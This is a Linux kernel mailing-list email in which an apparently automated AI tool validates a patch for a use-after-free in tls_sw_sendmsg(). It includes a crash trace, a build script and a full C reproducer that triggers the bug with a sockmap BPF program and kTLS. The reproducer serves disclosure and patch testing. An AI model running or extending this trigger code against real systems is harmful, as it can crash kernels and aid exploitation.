Return-Path: <netdev+bounces-297119-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id GJX7MeE8KGooAwMAu9opvQ
	(envelope-from <netdev+bounces-297119-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Tue, 09 Jun 2026 18:18:41 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sin.lore.kernel.org (sin.lore.kernel.org [104.64.211.4])
	by mail.lfdr.de (Postfix) with ESMTPS id C158D662449
	for <lists+netdev@lfdr.de>; Tue, 09 Jun 2026 18:18:40 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=linux.alibaba.com header.s=default header.b=t1fBsLOT;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-297119-lists+netdev=lfdr.de@vger.kernel.org" designates 104.64.211.4 as permitted sender) smtp.mailfrom="netdev+bounces-297119-lists+netdev=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=none) header.from=linux.alibaba.com;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sin.lore.kernel.org (Postfix) with ESMTP id 3E5EC3066647
	for <lists+netdev@lfdr.de>; Tue,  9 Jun 2026 15:26:42 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 375C63FF1D9;
	Tue,  9 Jun 2026 15:26:30 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from out30-99.freemail.mail.aliyun.com (out30-99.freemail.mail.aliyun.com [115.124.30.99])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0B5BD36607C;
	Tue,  9 Jun 2026 15:26:23 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781018790; cv=none; b=SoKqsQmkjDZ7Y3L12xMc/ZkAOBFBZS2jcFXHwLcZ3WcBbMYgkNmF9mK79r/n6VJgxp0VuPfh5RyP4pR+SNuDrGKx8cLknGJdIO0MUknaqAFnYoANLlux197sJwlxumIWGBGOBH2yLO9Dn0KWXZGEhKRKZ5ysGe0IjwyFCCi0Rwk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781018790; c=relaxed/simple;
	bh=F7eqkvbYSOeBp6aYZFkKstB0+Z7c6VHnKb0R7eniyrc=;
	h=From:To:Cc:Subject:In-Reply-To:References:Date:Message-Id:
	 Content-Type:MIME-Version; b=bUogKAdmxL+ZpBlYCSw6MDyLYBbRIYNYpQYbP0igr2+f3+kGcfJJTpqyEHuFVtUNdOP7qpv03ZGAblftJNqd1PXQJtJQf1k1UgPQQihjN+86dBu9JGpLrjl70JfdUUCFPyh2H3P/ZOCKj2R0af0s60SJZnc+uR17kvV7ymoxDOc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.alibaba.com; spf=pass smtp.mailfrom=linux.alibaba.com; dkim=pass (1024-bit key) header.d=linux.alibaba.com header.i=@linux.alibaba.com header.b=t1fBsLOT; arc=none smtp.client-ip=115.124.30.99
DKIM-Signature:v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux.alibaba.com; s=default;
	t=1781018780; h=From:To:Subject:Date:Message-Id:Content-Type:MIME-Version;
	bh=O55iUPLS8CD9A19UQnznUW9jhOsY23zIP2oD3XEQlXM=;
	b=t1fBsLOTmLopwUFwgMC5UpBHwvkH94Ny0bxLTjPpelP2tWarg5rvo8SxoSo/B+BYSsiGIhlUG3PS9sb085RZfrS+rDYLmxndHsRDVWvnf7+YTnUEre6r2qpVvQoMW/pmsTl1et0+huR653FLRzs30aLnSOxGDXRoiC13nfRSrPI=
X-Alimail-AntiSpam:AC=PASS;BC=-1|-1;BR=01201311R101e4;CH=green;DM=||false|;DS=||;FP=0|-1|-1|-1|0|-1|-1|-1;HT=maildocker-contentspam033037009110;MF=abaci@linux.alibaba.com;NM=1;PH=DS;RN=14;SR=0;TI=SMTPD_---0X4WwTDQ_1781018779;
Received: from x31j01071.sqa.na131(mailfrom:abaci@linux.alibaba.com fp:SMTPD_---0X4WwTDQ_1781018779 cluster:ay36)
          by smtp.aliyun-inc.com;
          Tue, 09 Jun 2026 23:26:20 +0800
From: abaci-kreproducer <abaci@linux.alibaba.com>
To: Sechang Lim <rhkrqnwk98@gmail.com>
Cc: John Fastabend <john.fastabend@gmail.com>,
 Jakub Kicinski <kuba@kernel.org>, Sabrina Dubroca <sd@queasysnail.net>,
 David S . Miller <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>,
 Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
 Jiayuan Chen <jiayuan.chen@linux.dev>, Alexei Starovoitov <ast@kernel.org>,
 netdev@vger.kernel.org, bpf@vger.kernel.org, linux-kernel@vger.kernel.org,
 Oliver <oliver.yang@linux.alibaba.com>
Subject:
 Re: [PATCH net] tls: fix use-after-free in tls_sw_sendmsg() cork error path
In-Reply-To: <20260605214802.1647008-1-rhkrqnwk98@gmail.com>
References: <20260605214802.1647008-1-rhkrqnwk98@gmail.com>
Date: Tue, 09 Jun 2026 23:25:56 +0800
Message-Id: <178101875671.841617.9555980064609175426@linux.alibaba.com>
User-Agent: abaci-kreproducer (abaci-oracle mail_sender)
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-10.65 / 15.00];
	WHITELIST_DMARC(-7.00)[alibaba.com:D:+];
	WHITELIST_SPF_DKIM(-3.00)[alibaba.com:d:+,kernel.org:s:+];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[linux.alibaba.com,none];
	R_DKIM_ALLOW(-0.20)[linux.alibaba.com:s=default];
	R_SPF_ALLOW(-0.20)[+ip4:104.64.211.4:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	XM_UA_NO_VERSION(0.01)[];
	RCVD_COUNT_THREE(0.00)[4];
	RCVD_TLS_LAST(0.00)[];
	FORGED_RECIPIENTS(0.00)[m:rhkrqnwk98@gmail.com,m:john.fastabend@gmail.com,m:kuba@kernel.org,m:sd@queasysnail.net,m:davem@davemloft.net,m:edumazet@google.com,m:pabeni@redhat.com,m:horms@kernel.org,m:jiayuan.chen@linux.dev,m:ast@kernel.org,m:netdev@vger.kernel.org,m:bpf@vger.kernel.org,m:linux-kernel@vger.kernel.org,m:oliver.yang@linux.alibaba.com,m:johnfastabend@gmail.com,s:lists@lfdr.de];
	FREEMAIL_TO(0.00)[gmail.com];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCPT_COUNT_TWELVE(0.00)[14];
	FORGED_SENDER(0.00)[abaci@linux.alibaba.com,netdev@vger.kernel.org];
	MIME_TRACE(0.00)[0:+];
	FORWARDED(0.00)[lists@lfdr.de];
	TAGGED_FROM(0.00)[bounces-297119-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	TO_DN_SOME(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[abaci@linux.alibaba.com,netdev@vger.kernel.org];
	FREEMAIL_CC(0.00)[gmail.com,kernel.org,queasysnail.net,davemloft.net,google.com,redhat.com,linux.dev,vger.kernel.org,linux.alibaba.com];
	MID_RHS_MATCH_FROM(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DKIM_TRACE(0.00)[linux.alibaba.com:+];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ASN(0.00)[asn:63949, ipnet:104.64.192.0/19, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sin.lore.kernel.org:rdns,sin.lore.kernel.org:helo,vger.kernel.org:from_smtp,alibaba.com:email,linux.alibaba.com:dkim,linux.alibaba.com:mid,linux.alibaba.com:from_mime]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: C158D662449

From: abaci-kreproducer <abaci@linux.alibaba.com>

This is an AI-generated validation of this patch. The issue was
reproduced on the unpatched kernel, and the original symptoms were no
longer observed on the patched kernel. However, additional issues were
identified during validation (details below).

Tested-by: abaci-kreproducer <abaci@linux.alibaba.com>
---
We reproduced this issue on the unpatched kernel:

KASAN reported a slab-use-after-free in tls_sw_sendmsg+0x1df5/0x1f40:
a 4-byte read of the freed cork_bytes field inside a freed kmalloc-4k
object.

In tls_sw_sendmsg_locked(), msg_pl is cached before bpf_exec_tx_verdict().
When a BPF SK_MSG program forces a record split via apply_bytes, the
original tls_rec is freed but msg_pl remains stale. The subsequent
-ENOSPC error path dereferences msg_pl->cork_bytes, triggering UAF.

The reproducer uses a sockmap with an SK_MSG program that sets
apply_bytes=3D100 and cork_bytes=3D32768. Sending 8KB with MSG_MORE followed
by 8KB without MSG_MORE triggers the split and stale pointer dereference.

On the patched kernel, no KASAN slab-use-after-free is reported.

Additional issues were identified during validation: the patched kernel
hits a fatal kernel BUG at lib/iov_iter.c:635 (Oops: invalid opcode) in
iov_iter_revert+0x39b/0x3e0, called from tls_sw_sendmsg+0x1aac/0x20f0.
This appears to be a new failure mode exposed by the fix.

    kernel BUG at lib/iov_iter.c:635!
    Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
    RIP: 0010:iov_iter_revert+0x39b/0x3e0
    Call Trace:
      tls_sw_sendmsg+0x1aac/0x20f0
      __sys_sendto+0x35b/0x3e0
      __x64_sys_sendto+0xdc/0x1b0
      do_syscall_64+0x10d/0x510
      entry_SYSCALL_64_after_hwframe+0x77/0x7f

---
Key configuration
* kconfig:
CONFIG_TLS=3Dy
CONFIG_BPF_SYSCALL=3Dy
CONFIG_INET=3Dy
CONFIG_KASAN=3Dy
CONFIG_KASAN_GENERIC=3Dy
CONFIG_KASAN_INLINE=3Dy
CONFIG_NET_SOCK_MSG=3Dy
CONFIG_CRYPTO_AES=3Dy
CONFIG_CRYPTO_GCM=3Dy
* kernel_cmdline: -
* rpm package: -
--
run.sh
#!/bin/bash
set -eu

SCRIPT_DIR=3D"$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN_DIR=3D"${SCRIPT_DIR}/bin"
RESULTS_DIR=3D"${SCRIPT_DIR}/results"
REPRODUCER_SRC=3D"${BIN_DIR}/reproducer.c"
REPRODUCER_BIN=3D"${BIN_DIR}/reproducer"

mkdir -p "${RESULTS_DIR}"

echo "=3D=3D=3D TLS kTLS sendmsg cork UAF reproducer =3D=3D=3D"
echo "Commit: 7723129261d09c9328bd1b332598b9fd465ad823"
echo ""

echo "[*] Checking kernel config..."
KCONFIG=3D"$(zcat /proc/config.gz 2>/dev/null || cat /boot/config-$(uname -r)=
 2>/dev/null || echo "")"

check_config() {
    echo "$KCONFIG" | grep -cE "$1=3D[ym]" > /dev/null 2>&1
}

if ! check_config "CONFIG_TLS"; then
	echo "[!] CONFIG_TLS not enabled. Cannot reproduce."
	exit 1
fi
if ! check_config "CONFIG_BPF_SYSCALL"; then
	echo "[!] CONFIG_BPF_SYSCALL not enabled. Cannot reproduce."
	exit 1
fi
if ! check_config "CONFIG_NET_SOCK_MSG"; then
	echo "[!] CONFIG_NET_SOCK_MSG not enabled. Cannot reproduce."
	exit 1
fi
if check_config "CONFIG_KASAN"; then
	echo "[*] KASAN is enabled (will detect UAF)"
else
	echo "[*] WARNING: KASAN not enabled. UAF may not be detected by kernel."
fi

modprobe tls || true

echo "[*] Compiling reproducer..."
gcc -o "${REPRODUCER_BIN}" "${REPRODUCER_SRC}" -Wall -O2 -lpthread
echo "[*] Compiled: ${REPRODUCER_BIN}"

dmesg -C

echo "[*] Running reproducer..."
"${REPRODUCER_BIN}" 2>&1 | tee "${RESULTS_DIR}/test-output.txt" || true

echo ""
echo "[*] Collecting dmesg output..."
dmesg > "${RESULTS_DIR}/dmesg-errors.txt" 2>&1 || true

if dmesg | grep -ciE "KASAN.*use-after-free|slab-use-after-free" | grep -qv "=
^0$"; then
	echo ""
	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
	echo "  BUG REPRODUCED: KASAN detected UAF!"
	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
	echo ""
	echo "Relevant dmesg lines:"
	dmesg | grep -iE "BUG:|KASAN:|use-after-free|slab-use-after-free|tls_sw_send=
msg" | tail -20
	exit 0
fi

if dmesg | grep -ciE "Oops|general protection|kernel panic" | grep -qv "^0$";=
 then
	echo ""
	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
	echo "  BUG REPRODUCED: kernel error detected!"
	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
	echo ""
	dmesg | grep -iE "Oops|general protection|kernel panic" | tail -10
	exit 0
fi

echo ""
echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
echo "  Bug NOT detected (KASAN may be required)"
echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
exit 1
--
reproducer.c
/*
 * Reproducer for: tls: fix use-after-free in tls_sw_sendmsg() cork error path
 * Commit: 7723129261d09c9328bd1b332598b9fd465ad823
 *
 * Bug: In tls_sw_sendmsg_locked(), msg_pl is cached from ctx->open_rec before
 * calling bpf_exec_tx_verdict(). When the attached SK_MSG BPF program calls
 * bpf_msg_apply_bytes() + bpf_msg_push_data(), tls_push_record() splits the
 * open record: the original record is encrypted, queued and freed by
 * tls_tx_records(), while ctx->open_rec is replaced by the split remainder.
 * If the BPF program also sets cork_bytes, the second iteration in
 * bpf_exec_tx_verdict() returns -ENOSPC, and the error path dereferences the
 * now-dangling msg_pl (use-after-free).
 *
 * Fix: Re-fetch msg_pl from ctx->open_rec before accessing cork_bytes in
 * the -ENOSPC error path.
 *
 * Trigger:
 *   1. Create TCP socket, add to sockmap with SK_MSG BPF program
 *   2. Enable kTLS TX (AES-GCM-128)
 *   3. BPF program: apply_bytes(100) + push_data(0, 200) + cork_bytes(32768)
 *   4. Send 8KB with MSG_MORE (accumulates data in open record)
 *   5. Send 8KB without MSG_MORE (fills TLS record -> split + cork ENOSPC ->=
 UAF)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/tls.h>
#include <linux/bpf.h>

#ifndef SOL_TLS
#define SOL_TLS 300
#endif

#ifndef TLS_1_2_VERSION
#define TLS_1_2_VERSION 0x0303
#endif

/* BPF helper function IDs */
#define BPF_FUNC_msg_apply_bytes 61
#define BPF_FUNC_msg_cork_bytes  62
#define BPF_FUNC_msg_push_data   90

#define BPF_JMP     0x05
#define BPF_ALU     0x04
#define BPF_ALU64   0x07
#define BPF_K       0x00
#define BPF_X       0x08
#define BPF_MOV     0xb0
#define BPF_CALL    0x80
#define BPF_EXIT    0x90

#define SK_PASS 1
#define NUM_ITERATIONS 3
#define SEND_SIZE 8192

/*
 * SK_MSG BPF program (raw insns, no clang required):
 *   R6 =3D R1;                                  // save ctx (callee-saved)
 *   R2 =3D 100;  bpf_msg_apply_bytes(ctx, 100); // force record split at 100=
 bytes
 *   R1 =3D R6;                                  // restore ctx after call
 *   R2 =3D 0; R3 =3D 200; R4 =3D 0;
 *   bpf_msg_push_data(ctx, 0, 200, 0);        // grow sg.size beyond encrypt=
ed buffer
 *   R1 =3D R6;                                  // restore ctx
 *   R2 =3D 32768; bpf_msg_cork_bytes(ctx, 32768); // cork at 32KB
 *   R0 =3D SK_PASS; return SK_PASS;
 *
 * How the UAF is triggered:
 *   1st BPF invocation: apply_bytes=3D100 causes tls_push_record() to split =
the
 *     open record. The front part (100 bytes) is encrypted, queued, and freed
 *     by tls_tx_records(). ctx->open_rec now points to the split remainder.
 *     push_data(0,200) grows sg.size, ensuring the split triggers correctly.
 *   2nd BPF invocation (on remainder): apply_bytes was consumed (0), so BPF
 *     re-runs. cork_bytes=3D32768 is set. Since 32768 > remainder size and n=
ot
 *     a full record, bpf_exec_tx_verdict() returns -ENOSPC.
 *   Back in tls_sw_sendmsg_locked(): msg_pl still points to the OLD record
 *     (freed in step 1). Accessing msg_pl->cork_bytes is a use-after-free.
 */
static struct bpf_insn bpf_prog[] =3D {
	/* R6 =3D R1 (save ctx to callee-saved register) */
	{ .code =3D BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg =3D 6, .src_reg =3D 1, .of=
f =3D 0, .imm =3D 0 },
	/* bpf_msg_apply_bytes(ctx, 100) */
	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 2, .src_reg =3D 0, .off =
=3D 0, .imm =3D 100 },
	{ .code =3D BPF_JMP | BPF_CALL, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
.imm =3D BPF_FUNC_msg_apply_bytes },
	/* R1 =3D R6 (restore ctx after call clobbered R1) */
	{ .code =3D BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg =3D 1, .src_reg =3D 6, .of=
f =3D 0, .imm =3D 0 },
	/* bpf_msg_push_data(ctx, offset=3D0, length=3D200, flags=3D0) */
	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 2, .src_reg =3D 0, .off =
=3D 0, .imm =3D 0 },
	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 3, .src_reg =3D 0, .off =
=3D 0, .imm =3D 200 },
	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 4, .src_reg =3D 0, .off =
=3D 0, .imm =3D 0 },
	{ .code =3D BPF_JMP | BPF_CALL, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
.imm =3D BPF_FUNC_msg_push_data },
	/* R1 =3D R6 (restore ctx) */
	{ .code =3D BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg =3D 1, .src_reg =3D 6, .of=
f =3D 0, .imm =3D 0 },
	/* bpf_msg_cork_bytes(ctx, 32768) */
	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 2, .src_reg =3D 0, .off =
=3D 0, .imm =3D 32768 },
	{ .code =3D BPF_JMP | BPF_CALL, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
.imm =3D BPF_FUNC_msg_cork_bytes },
	/* return SK_PASS */
	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 0, .src_reg =3D 0, .off =
=3D 0, .imm =3D SK_PASS },
	{ .code =3D BPF_JMP | BPF_EXIT, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
.imm =3D 0 },
};

static int bpf_prog_fd =3D -1;
static int map_fd_global =3D -1;
static volatile int server_done =3D 0;

static int sys_bpf(int cmd, union bpf_attr *attr)
{
	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static void *server_thread(void *arg)
{
	int listen_fd =3D *(int *)arg;
	char buf[4096];

	int conn_fd =3D accept(listen_fd, NULL, NULL);
	if (conn_fd < 0) {
		perror("accept");
		return NULL;
	}

	while (!server_done) {
		ssize_t n =3D read(conn_fd, buf, sizeof(buf));
		if (n <=3D 0)
			break;
	}

	close(conn_fd);
	return NULL;
}

static void cleanup(int client_fd, int listen_fd)
{
	server_done =3D 1;
	if (client_fd >=3D 0)
		shutdown(client_fd, SHUT_RDWR);
	usleep(100000);
	if (client_fd >=3D 0)
		close(client_fd);
	if (listen_fd >=3D 0)
		close(listen_fd);
	if (map_fd_global >=3D 0) {
		close(map_fd_global);
		map_fd_global =3D -1;
	}
	if (bpf_prog_fd >=3D 0) {
		close(bpf_prog_fd);
		bpf_prog_fd =3D -1;
	}
}

static int setup_and_trigger(int iteration)
{
	struct sockaddr_in addr;
	socklen_t addrlen =3D sizeof(addr);
	pthread_t tid;
	int listen_fd =3D -1, client_fd =3D -1, map_fd =3D -1;

	printf("[%d] Setting up TCP connection on loopback...\n", iteration);

	listen_fd =3D socket(AF_INET, SOCK_STREAM, 0);
	if (listen_fd < 0) {
		perror("socket(listen)");
		return 1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family =3D AF_INET;
	addr.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
	addr.sin_port =3D 0;

	if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("bind");
		close(listen_fd);
		return 1;
	}

	if (listen(listen_fd, 1) < 0) {
		perror("listen");
		close(listen_fd);
		return 1;
	}

	addrlen =3D sizeof(addr);
	getsockname(listen_fd, (struct sockaddr *)&addr, &addrlen);

	pthread_create(&tid, NULL, server_thread, &listen_fd);

	client_fd =3D socket(AF_INET, SOCK_STREAM, 0);
	if (client_fd < 0) {
		perror("socket(client)");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	if (connect(client_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("connect");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	/* STEP 1: Create sockmap and attach BPF BEFORE setting up TLS ULP.
	 * sk_psock_init() rejects sockets that already have ULP (TLS) attached. */
	printf("[%d] Creating sockmap and loading BPF program...\n", iteration);

	union bpf_attr map_attr;
	memset(&map_attr, 0, sizeof(map_attr));
	map_attr.map_type =3D BPF_MAP_TYPE_SOCKMAP;
	map_attr.key_size =3D sizeof(int);
	map_attr.value_size =3D sizeof(int);
	map_attr.max_entries =3D 1;

	map_fd =3D sys_bpf(BPF_MAP_CREATE, &map_attr);
	if (map_fd < 0) {
		perror("bpf(BPF_MAP_CREATE)");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}
	map_fd_global =3D map_fd;

	char log_buf[4096] =3D {0};
	union bpf_attr prog_attr;
	memset(&prog_attr, 0, sizeof(prog_attr));
	prog_attr.prog_type =3D BPF_PROG_TYPE_SK_MSG;
	prog_attr.insns =3D (unsigned long long)bpf_prog;
	prog_attr.insn_cnt =3D sizeof(bpf_prog) / sizeof(bpf_prog[0]);
	prog_attr.license =3D (unsigned long long)"GPL";
	prog_attr.log_buf =3D (unsigned long long)log_buf;
	prog_attr.log_size =3D sizeof(log_buf);
	prog_attr.log_level =3D 1;
	prog_attr.kern_version =3D 0;

	bpf_prog_fd =3D sys_bpf(BPF_PROG_LOAD, &prog_attr);
	if (bpf_prog_fd < 0) {
		perror("bpf(BPF_PROG_LOAD)");
		fprintf(stderr, "BPF verifier log:\n%s\n", log_buf);
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	union bpf_attr attach_attr;
	memset(&attach_attr, 0, sizeof(attach_attr));
	attach_attr.attach_type =3D BPF_SK_MSG_VERDICT;
	attach_attr.target_fd =3D map_fd;
	attach_attr.attach_bpf_fd =3D bpf_prog_fd;

	if (sys_bpf(BPF_PROG_ATTACH, &attach_attr) < 0) {
		perror("bpf(BPF_PROG_ATTACH)");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	/* Add client socket to sockmap BEFORE TLS setup */
	int key =3D 0;
	union bpf_attr update_attr;
	memset(&update_attr, 0, sizeof(update_attr));
	update_attr.map_fd =3D map_fd;
	update_attr.key =3D (unsigned long long)&key;
	update_attr.value =3D (unsigned long long)&client_fd;
	update_attr.flags =3D 0;

	if (sys_bpf(BPF_MAP_UPDATE_ELEM, &update_attr) < 0) {
		perror("bpf(BPF_MAP_UPDATE_ELEM)");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	/* STEP 2: Set up TLS ULP and kTLS TX */
	printf("[%d] Enabling kTLS TX (AES-GCM-128)...\n", iteration);

	/* Attach TLS ULP to the socket (TCP_ULP =3D 31) */
	if (setsockopt(client_fd, IPPROTO_TCP, 31, "tls", 3) < 0) {
		perror("setsockopt(TCP_ULP, tls)");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	struct tls12_crypto_info_aes_gcm_128 crypto_info;
	memset(&crypto_info, 0, sizeof(crypto_info));
	crypto_info.info.version =3D TLS_1_2_VERSION;
	crypto_info.info.cipher_type =3D TLS_CIPHER_AES_GCM_128;

	if (setsockopt(client_fd, SOL_TLS, TLS_TX, &crypto_info, sizeof(crypto_info)=
) < 0) {
		perror("setsockopt(TLS_TX)");
		fprintf(stderr, "Hint: CONFIG_TLS=3Dy required\n");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	printf("[%d] Setup complete. Triggering UAF...\n", iteration);

	char *buf =3D calloc(1, SEND_SIZE);
	if (!buf) {
		perror("calloc");
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	/* First send with MSG_MORE: accumulates data in the open record
	 * without triggering bpf_exec_tx_verdict (eor=3Dfalse, full_record=3Dfalse)=
 */
	printf("[%d] Sending %d bytes with MSG_MORE (accumulating)...\n", iteration,=
 SEND_SIZE);
	ssize_t n =3D send(client_fd, buf, SEND_SIZE, MSG_MORE);
	if (n < 0) {
		fprintf(stderr, "[%d] First send failed: %s\n", iteration, strerror(errno));
		free(buf);
		cleanup(client_fd, listen_fd);
		pthread_join(tid, NULL);
		return 1;
	}
	printf("[%d] Sent %zd bytes (MSG_MORE)\n", iteration, n);

	/* Second send without MSG_MORE: eor=3Dtrue triggers bpf_exec_tx_verdict.
	 * BPF program sets apply_bytes(100) -> split -> push_data(200) -> cork_byte=
s(32768).
	 * Split frees the original record, remainder goes to 2nd BPF call which
	 * sets cork_bytes > remainder size -> -ENOSPC -> UAF on dangling msg_pl. */
	printf("[%d] Sending %d bytes without MSG_MORE (triggering UAF)...\n", itera=
tion, SEND_SIZE);
	n =3D send(client_fd, buf, SEND_SIZE, 0);
	if (n < 0) {
		fprintf(stderr, "[%d] Second send: %s (errno=3D%d)\n", iteration, strerror(=
errno), errno);
	} else {
		printf("[%d] Sent %zd bytes\n", iteration, n);
	}

	free(buf);
	usleep(50000);

	printf("[%d] Checking dmesg for KASAN reports...\n", iteration);
	fflush(stdout);
	system("dmesg | grep -iE 'BUG:|KASAN:|use-after-free|slab-use-after-free|tls=
_sw_sendmsg' | tail -10");

	cleanup(client_fd, listen_fd);
	pthread_join(tid, NULL);
	return 0;
}

int main(void)
{
	printf("[*] Reproducer: TLS kTLS sendmsg cork UAF (7723129261d0)\n");
	printf("[*] Trigger: bpf_msg_apply_bytes() + bpf_msg_push_data() + bpf_msg_c=
ork_bytes()\n");
	printf("[*] BPF helpers: apply=3D%d, cork=3D%d, push=3D%d\n",
	       BPF_FUNC_msg_apply_bytes, BPF_FUNC_msg_cork_bytes, BPF_FUNC_msg_push_=
data);
	printf("[*] Running %d iterations\n\n", NUM_ITERATIONS);

	alarm(60);
	system("dmesg -C 2>/dev/null");

	for (int i =3D 0; i < NUM_ITERATIONS; i++) {
		int ret =3D setup_and_trigger(i);
		if (ret !=3D 0) {
			fprintf(stderr, "[%d] Setup/trigger failed with code %d\n", i, ret);
			continue;
		}

		int kasan_found =3D 0;
		FILE *fp =3D popen("dmesg | grep -ciE 'KASAN:.*use-after-free|slab-use-afte=
r-free' 2>/dev/null", "r");
		if (fp) {
			int count =3D 0;
			if (fscanf(fp, "%d", &count) =3D=3D 1 && count > 0)
				kasan_found =3D 1;
			pclose(fp);
		}

		if (kasan_found) {
			printf("\n[!] KASAN use-after-free detected at iteration %d!\n", i);
			break;
		}
	}

	printf("\n[*] Final dmesg check:\n");
	fflush(stdout);
	system("dmesg | grep -iE 'BUG:|KASAN:|use-after-free|slab-use-after-free|tls=
_sw_sendmsg' | tail -30");

	return 0;
}

